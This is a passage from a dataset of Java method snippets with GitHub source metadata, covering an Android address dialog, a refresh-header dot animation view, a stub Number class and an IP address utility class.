ViewHolder(textView);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "MyAdapter", "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56444, "method_name": "onBindView", "class_name": "ViewHolder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void onBindView(int position) {\n                mTextView.setText(getItem(position).getName());\n            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "MyAdapter", "implements": null, "modifiers": ["final"]}}, {"id": 56445, "method_name": "getName", "class_name": "AddressBean", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "        private String getName() {\n            return name;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56446, "method_name": "getNext", "class_name": "AddressBean", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JSONObject", "snippet": "        private JSONObject getNext() {\n            return next;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56447, "method_name": "getProvinceList", "class_name": "AddressManager", "params": ["Context"], "throws": null, "modifiers": ["static", "private"], "return_type": "List<AddressBean>", "snippet": "        private static List<AddressBean> getProvinceList(Context context) {\n            try {\n                // \u7701\u5e02\u533aJson\u6570\u636e\u6587\u4ef6\u6765\u6e90\uff1ahttps://github.com/getActivity/ProvinceJson\n                JSONArray jsonArray = getProvinceJson(context);\n\n                if (jsonArray != null) {\n\n                    int length = jsonArray.length();\n                    ArrayList<AddressBean> list = new ArrayList<>(length);\n                    for (int i = 0; i < length; i++) {\n                        JSONObject jsonObject = jsonArray.getJSONObject(i);\n                        list.add(new AddressBean(jsonObject.getString(\"name\"), jsonObject));\n                    }\n\n                    return list;\n                }\n\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n            return null;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56448, "method_name": "getCityList", "class_name": "AddressManager", "params": ["JSONObject"], "throws": null, "modifiers": ["static", "private"], "return_type": "List<AddressBean>", "snippet": "        private static List<AddressBean> getCityList(JSONObject jsonObject) {\n            try {\n                JSONArray listCity = jsonObject.getJSONArray(\"city\");\n                int length = listCity.length();\n\n                ArrayList<AddressBean> list = new ArrayList<>(length);\n\n                for (int i = 0; i < length; i++) {\n                    list.add(new AddressBean(listCity.getJSONObject(i).getString(\"name\"), listCity.getJSONObject(i)));\n                }\n\n                return list;\n            } catch (JSONException e) {\n                e.printStackTrace();\n                return null;\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56449, "method_name": "getAreaList", "class_name": "AddressManager", "params": ["JSONObject"], "throws": null, "modifiers": ["static", "private"], "return_type": "List<AddressBean>", "snippet": "        private static List<AddressBean> getAreaList(JSONObject jsonObject) {\n            try {\n                JSONArray listArea = jsonObject.getJSONArray(\"area\");\n                int length = listArea.length();\n\n                ArrayList<AddressBean> list = new ArrayList<>(length);\n\n                for (int i = 0; i < length; i++) {\n                    String string = listArea.getString(i);\n                    list.add(new AddressBean(string, null));\n                }\n                return list;\n            } catch (JSONException e) {\n                e.printStackTrace();\n                return null;\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56450, "method_name": "getProvinceJson", "class_name": "AddressManager", "params": ["Context"], "throws": null, "modifiers": ["static", "private"], "return_type": "JSONArray", "snippet": "        private static JSONArray getProvinceJson(Context context) {\n            try {\n                InputStream inputStream = context.getResources().openRawResource(R.raw.province);\n                ByteArrayOutputStream outStream = new ByteArrayOutputStream();\n                byte[] buffer = new byte[512];\n                int length;\n                while ((length = inputStream.read(buffer)) != -1) {\n                    outStream.write(buffer, 0, length);\n                }\n                outStream.close();\n                inputStream.close();\n                return new JSONArray(outStream.toString());\n            } catch (IOException | JSONException e) {\n                e.printStackTrace();\n            }\n            return null;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56451, "method_name": "setCir_x", "class_name": "GoogleDotView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCir_x(int cir_x) {\n        this.cir_x = cir_x;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56452, "method_name": "init", "class_name": "GoogleDotView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {\n        r = DensityUtil.dp2px(getContext(), 4);\n\n        mPath = new Paint();\n        mPath.setAntiAlias(true);\n        mPath.setColor(Color.rgb(114, 114, 114));\n\n        animator1 = ValueAnimator.ofFloat(1f, 1.2f, 1f, 0.8f);\n        animator1.setDuration(800);\n        animator1.setInterpolator(new DecelerateInterpolator());\n        animator1.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(ValueAnimator animation) {\n                fraction1 = (float) animation.getAnimatedValue();\n                invalidate();\n            }\n        });\n        animator1.setRepeatCount(ValueAnimator.INFINITE);\n        animator1.setRepeatMode(ValueAnimator.REVERSE);\n\n        animator2 = ValueAnimator.ofFloat(1f, 0.8f, 1f, 1.2f);\n        animator2.setDuration(800);\n        animator2.setInterpolator(new DecelerateInterpolator());\n        animator2.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(ValueAnimator animation) {\n                fraction2 = (float) animation.getAnimatedValue();\n            }\n        });\n        animator2.setRepeatCount(ValueAnimator.INFINITE);\n        animator2.setRepeatMode(ValueAnimator.REVERSE);\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56453, "method_name": "onDraw", "class_name": "GoogleDotView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n        int w = getMeasuredWidth() / num - 10;\n        for (int i = 0; i < num; i++) {\n            if (animating) {\n                switch (i) {\n                    //                    case 0:\n                    //                        mPath.setAlpha(35);\n                    //                        mPath.setColor(getResources().getColor(R.color.Orange));\n                    //                        canvas.drawCircle(getMeasuredWidth() / 2 - cir_x * 3 - 3 * w / 3 * 2, getMeasuredHeight() / 2, r*fraction2, mPath);\n                    //                        break;\n                    case 0:\n                        mPath.setAlpha(105);\n                        mPath.setColor(getResources().getColor(R.color.Yellow));\n                        canvas.drawCircle(getMeasuredWidth() / 2 - cir_x * 2 - 2 * w / 3 * 2, getMeasuredHeight() / 2, r * fraction2, mPath);\n                        break;\n                    case 1:\n                        mPath.setAlpha(145);\n                        mPath.setColor(getResources().getColor(R.color.Green));\n                        canvas.drawCircle(getMeasuredWidth() / 2 - cir_x * 1 - w / 3 * 2, getMeasuredHeight() / 2, r * fraction2, mPath);\n                        break;\n                    case 2:\n                        mPath.setAlpha(255);\n                        mPath.setColor(getResources().getColor(R.color.Blue));\n                        canvas.drawCircle(getMeasuredWidth() / 2, getMeasuredHeight() / 2, r * fraction1, mPath);\n                        break;\n                    case 3:\n                        mPath.setAlpha(145);\n                        mPath.setColor(getResources().getColor(R.color.Orange));\n                        canvas.drawCircle(getMeasuredWidth() / 2 + cir_x * 1 + w / 3 * 2, getMeasuredHeight() / 2, r * fraction2, mPath);\n                        break;\n                    case 4:\n                        mPath.setAlpha(105);\n                        mPath.setColor(getResources().getColor(R.color.Yellow));\n                        canvas.drawCircle(getMeasuredWidth() / 2 + cir_x * 2 + 2 * w / 3 * 2, getMeasuredHeight() / 2, r * fraction2, mPath);\n                        break;\n                    //                    case 6:\n                    //                        mPath.setAlpha(35);\n                    //                        mPath.setColor(getResources().getColor(R.color.Green));\n                    //                        canvas.drawCircle(getMeasuredWidth() / 2 + cir_x * 3 + 3 * w / 3 * 2, getMeasuredHeight() / 2, r*fraction2, mPath);\n                    //                        break;\n                }\n            } else {\n                switch (i) {\n                    //                    case 0:\n                    //                        mPath.setAlpha(35);\n                    //                        mPath.setColor(getResources().getColor(R.color.Orange));\n                    //                        canvas.drawCircle(getMeasuredWidth() / 2 - cir_x * 3 - 3 * w / 3 * 2, getMeasuredHeight() / 2, r, mPath);\n                    //                        break;\n                    case 0:\n                        mPath.setAlpha(105);\n                        mPath.setColor(getResources().getColor(R.color.Yellow));\n                        canvas.drawCircle(getMeasuredWidth() / 2 - cir_x * 2 - 2 * w / 3 * 2, getMeasuredHeight() / 2, r, mPath);\n                        break;\n                    case 1:\n                        mPath.setAlpha(145);\n                        mPath.setColor(getResources().getColor(R.color.Green));\n                        canvas.drawCircle(getMeasuredWidth() / 2 - cir_x * 1 - w / 3 * 2, getMeasuredHeight() / 2, r, mPath);\n                        break;\n                    case 2:\n                        mPath.setAlpha(255);\n                        mPath.setColor(getResources().getColor(R.color.Blue));\n                        canvas.drawCircle(getMeasuredWidth() / 2, getMeasuredHeight() / 2, r, mPath);\n                        break;\n                    case 3:\n                        mPath.setAlpha(145);\n                        mPath.setColor(getResources().getColor(R.color.Orange));\n                        canvas.drawCircle(getMeasuredWidth() / 2 + cir_x * 1 + w / 3 * 2, getMeasuredHeight() / 2, r, mPath);\n                        break;\n                    case 4:\n                        mPath.setAlpha(105);\n                        mPath.setColor(getResources().getColor(R.color.Yellow));\n                        canvas.drawCircle(getMeasuredWidth() / 2 + cir_x * 2 + 2 * w / 3 * 2, getMeasuredHeight() / 2, r, mPath);\n                        break;\n                    //                    case 6:\n                    //                        mPath.setAlpha(35);\n                    //                        mPath.setColor(getResources().getColor(R.color.Green));\n                    //                        canvas.drawCircle(getMeasuredWidth() / 2 + cir_x * 3 + 3 * w / 3 * 2, getMeasuredHeight() / 2, r, mPath);\n                    //                        break;\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56454, "method_name": "onDetachedFromWindow", "class_name": "GoogleDotView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDetachedFromWindow() {\n        super.onDetachedFromWindow();\n        if (animator1 != null) animator1.cancel();\n        if (animator2 != null) animator2.cancel();\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56455, "method_name": "getView", "class_name": "GoogleDotView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getView() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56456, "method_name": "onPullingDown", "class_name": "GoogleDotView", "params": ["float", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPullingDown(float fraction, float maxHeadHeight, float headHeight) {\n        setScaleX(1 + fraction / 2);\n        setScaleY(1 + fraction / 2);\n        animating = false;\n        if (animator1.isRunning()) {\n            animator1.cancel();\n            invalidate();\n        }\n        if (animator2.isRunning()) animator2.cancel();\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56457, "method_name": "onPullReleasing", "class_name": "GoogleDotView", "params": ["float", "float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPullReleasing(float fraction, float maxHeadHeight, float headHeight) {\n        setScaleX(1 + fraction / 2);\n        setScaleY(1 + fraction / 2);\n        if (fraction < 1.0f) {\n            animating = false;\n            if (animator1.isRunning()) {\n                animator1.cancel();\n                invalidate();\n            }\n            if (animator2.isRunning()) animator2.cancel();\n        }\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56458, "method_name": "startAnim", "class_name": "GoogleDotView", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startAnim(float maxHeadHeight, float headHeight) {\n        animating = true;\n        animator1.start();\n        animator2.start();\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56459, "method_name": "onFinish", "class_name": "GoogleDotView", "params": ["OnAnimEndListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFinish(OnAnimEndListener listener) {\n        listener.onAnimEnd();\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56460, "method_name": "reset", "class_name": "GoogleDotView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {\n        animating = false;\n        if (animator1.isRunning()) animator1.cancel();\n        if (animator2.isRunning()) animator2.cancel();\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/refreshlibrary/src/main/java/com/lcodecore/tkrefreshlayout/header/GoogleDotView.java", "stars": "9", "class_props": {"extends": "View", "implements": ["IHeaderView"], "modifiers": ["public"]}}, {"id": 56461, "method_name": "intValue", "class_name": "ByteArrayNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int intValue() {\n        throw new AbstractMethodError();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ByteArrayNumber.java", "stars": "16", "class_props": {"extends": "Number", "implements": null, "modifiers": ["public"]}}, {"id": 56462, "method_name": "longValue", "class_name": "ByteArrayNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long longValue() {\n        throw new AbstractMethodError();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ByteArrayNumber.java", "stars": "16", "class_props": {"extends": "Number", "implements": null, "modifiers": ["public"]}}, {"id": 56463, "method_name": "floatValue", "class_name": "ByteArrayNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float floatValue() {\n        throw new AbstractMethodError();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ByteArrayNumber.java", "stars": "16", "class_props": {"extends": "Number", "implements": null, "modifiers": ["public"]}}, {"id": 56464, "method_name": "doubleValue", "class_name": "ByteArrayNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double doubleValue() {\n        throw new AbstractMethodError();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ByteArrayNumber.java", "stars": "16", "class_props": {"extends": "Number", "implements": null, "modifiers": ["public"]}}, {"id": 56465, "method_name": "hashCode", "class_name": "IpAddress", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int hashCode()\n\t{\n\t\treturn hashCode( address );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56466, "method_name": "hashCode", "class_name": "IpAddress", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int hashCode( final byte a[] )\n\t{\n\t\tif( a == null )\n\t\t{\n\t\t\treturn 0;\n\t\t}\n\n\t\tint result = 1;\n\n\t\tfor( int i = 0; i < a.length; i++ )\n\t\t{\n\t\t\tresult = 31 * result + a[i];\n\t\t}\n\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56467, "method_name": "equals", "class_name": "IpAddress", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean equals( final Object obj )\n\t{\n\t\tif( this == obj )\n\t\t{\n\t\t\treturn true;\n\t\t}\n\n\t\tif( obj == null )\n\t\t{\n\t\t\treturn false;\n\t\t}\n\n\t\tfinal byte[] a = address;\n\t\tfinal byte[] a2 = ((IpAddress)obj).address;\n\n\t\treturn equals( a, a2 );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56468, "method_name": "equals", "class_name": "IpAddress", "params": ["byte", "byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean equals( byte[] a, byte[] a2 )\n\t{\n\t\tif( a == a2 )\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t\telse if( a == null || a2 == null )\n\t\t{\n\t\t\treturn false;\n\t\t}\n\n\t\tint length = a.length;\n\t\tif( a2.length != length )\n\t\t{\n\t\t\treturn false;\n\t\t}\n\n\t\t// \u0431\u043e\u043b\u0435\u0435 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e, \u0447\u0442\u043e \u0447\u0430\u0449\u0435 \u0430\u0434\u0440\u0435\u0441\u0430 \u0431\u0443\u0434\u0443\u0442 \u0440\u0430\u0441\u0445\u043e\u0434\u0438\u0442\u044c\u0441\u044f \u0432 \u043a\u043e\u043d\u0446\u0435, \u043f\u043e\u044d\u0442\u043e\u043c\u0443 \u0441\u0440\u0430\u0432\u043d\u0438\u0432\u0430\u0442\u044c \u043d\u0430 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435 \u043b\u0443\u0447\u0448\u0435 \u0441 \u043a\u043e\u043d\u0446\u0430.\n\t\tfor( int i = length - 1; i >= 0; i-- )\n\t\t{\n\t\t\tif( a[i] != a2[i] )\n\t\t\t{\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56469, "method_name": "clear", "class_name": "IpAddress", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clear()\n\t{\n\t\tSystem.arraycopy( nullBytes, 0, address, 0, address.length );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56470, "method_name": "toString", "class_name": "IpAddress", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString()\n\t{\n\t\treturn toString( address );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56471, "method_name": "toString", "class_name": "IpAddress", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String toString( final byte[] address )\n\t{\n\t\tStringBuilder sb = new StringBuilder( 64 );\n\t\ttoString( address, sb );\n\t\treturn sb.toString();\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56472, "method_name": "toString", "class_name": "IpAddress", "params": ["byte", "StringBuilder"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void toString( final byte[] address, StringBuilder sb )\n\t{\n\t\tif( address == null )\n\t\t{\n\t\t\tsb.append( \"[IpAddress:null]\" );\n\t\t\treturn;\n\t\t}\n\n\t\tif( address.length == 4 )\n\t\t{\n\t\t\tsb.append( address[0] & 0xff ).append( '.' ).append( address[1] & 0xff ).append( '.' ).append( address[2] & 0xff ).append( '.' )\n\t\t\t\t.append( address[3] & 0xff );\n\t\t\treturn;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor( int i = 0, size = address.length; i < size; i += 2 )\n\t\t\t{\n\t\t\t\tint k = (address[i + 1] & 255) | (address[i] << 8 & 0xff00);\n\t\t\t\tsb.append( Integer.toHexString( k ) );\n\t\t\t\tsb.append( \":\" );\n\t\t\t}\n\n\t\t\tif( sb.length() > 0 )\n\t\t\t{\n\t\t\t\tsb.setLength( sb.length() - 1 );\n\t\t\t}\n\n\t\t\treturn;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56473, "method_name": "compare", "class_name": "IpAddress", "params": ["byte", "byte"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "int", "snippet": "\tpublic static final int compare( final byte[] v1, final byte[] v2 )\n\t{\n\t\tint k = 0;\n\t\tint lim = v1.length;\n\t\twhile( k < lim )\n\t\t{\n\t\t\tshort c1 = ((short)(v1[k] & 0xff));\n\t\t\tshort c2 = ((short)(v2[k] & 0xff));\n\t\t\tif( c1 != c2 )\n\t\t\t{\n\t\t\t\treturn c1 - c2;\n\t\t\t}\n\t\t\tk++;\n\t\t}\n\n\t\treturn 0;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56474, "method_name": "compare", "class_name": "IpAddress", "params": ["byte", "int", "int", "byte", "int", "int"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "int", "snippet": "\tpublic static final int compare( final byte[] v1, int i, final int len1, final byte[] v2, int j, final int len2 )\n\t{\n\t\tint n = Math.min( len1, len2 );\n\n\t\tif( i == j )\n\t\t{\n\t\t\tint k = i;\n\t\t\tint lim = n + i;\n\t\t\twhile( k < lim )\n\t\t\t{\n\t\t\t\tshort c1 = ((short)(v1[k] & 0xff));\n\t\t\t\tshort c2 = ((short)(v2[k] & 0xff));\n\t\t\t\tif( c1 != c2 )\n\t\t\t\t{\n\t\t\t\t\treturn c1 - c2;\n\t\t\t\t}\n\t\t\t\tk++;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile( n-- != 0 )\n\t\t\t{\n\t\t\t\tshort c1 = ((short)(v1[i++] & 0xff));\n\t\t\t\tshort c2 = ((short)(v2[j++] & 0xff));\n\t\t\t\tif( c1 != c2 )\n\t\t\t\t{\n\t\t\t\t\treturn c1 - c2;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\treturn len1 - len2;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56475, "method_name": "newAndIncrement", "class_name": "IpAddress", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "\tpublic static byte[] newAndIncrement( final byte[] ip )\n\t{\n\t\tbyte[] result = new byte[ip.length];\n\t\tSystem.arraycopy( ip, 0, result, 0, ip.length );\n\n\t\tif( increment( result ) )\n\t\t{\n\t\t\treturn result;\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn null;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56476, "method_name": "increment", "class_name": "IpAddress", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean increment( final byte[] ip )\n\t{\n\t\treturn increment( ip, 0 );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56477, "method_name": "increment", "class_name": "IpAddress", "params": ["byte", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean increment( final byte[] ip, int fromBit )\n\t{\n\t\tint pos = (ip.length - 1) - (fromBit / 8);\n\t\tint bit = fromBit % 8;\n\n\t\tif( bit > 0 )\n\t\t{\n\t\t\tint v = ((short)(ip[pos] & 0xff)) + (1 << bit);\n\t\t\tif( v <= 255 )\n\t\t\t{\n\t\t\t\tip[pos] = ((byte)((v + 1) & 0xff));\n\t\t\t\treturn true;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tip[pos--] = ((byte)(0 & 0xff));\n\t\t\t}\n\t\t}\n\t\t\n\t\tfor( int i = pos; i >= 0; i-- )\n\t\t{\n\t\t\tshort v = ((short)(ip[i] & 0xff));\n\t\t\tif( v < 255 )\n\t\t\t{\n\t\t\t\tip[i] = ((byte)((v + 1) & 0xff));\n\t\t\t\treturn true;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tip[i] = ((byte)(0 & 0xff));\n\t\t\t}\n\t\t}\n\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56478, "method_name": "newAndDecrement", "class_name": "IpAddress", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "\tpublic static byte[] newAndDecrement( final byte[] ip )\n\t{\n\t\tbyte[] result = new byte[ip.length];\n\t\tSystem.arraycopy( ip, 0, result, 0, ip.length );\n\n\t\tfor( int i = ip.length - 1; i >= 0; i-- )\n\t\t{\n\t\t\tshort v = ((short)(result[i] & 0xff));\n\t\t\tif( v > 0 )\n\t\t\t{\n\t\t\t\tresult[i] = ((byte)((v - 1) & 0xff));\n\t\t\t\treturn result;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tresult[i] = ((byte)(255 & 0xff));\n\t\t\t}\n\t\t}\n\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56479, "method_name": "compareTo", "class_name": "IpAddress", "params": ["IpAddress"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int compareTo( IpAddress o )\n\t{\n\t\treturn IpAddress.compare( this.address, 0, this.address.length, o.address, 0, o.address.length );\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/inet/IpAddress.java", "stars": "12", "class_props": {"extends": null, "implements": ["Comparable", "Serializable"], "modifiers": ["public"]}}, {"id": 56480, "method_name": "clone", "class_name": "IpAddress", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IpAddress", "snippet": "\tpublic IpAddress clone()\n\t{\n\t\tbyte[] addr = new byte[this.address.length];\n\t\tSystem.arraycopy( this.address, 0, addr, 0, addr.length );\n\n\t\treturn new IpAddress( addr );\n\t}", "url": 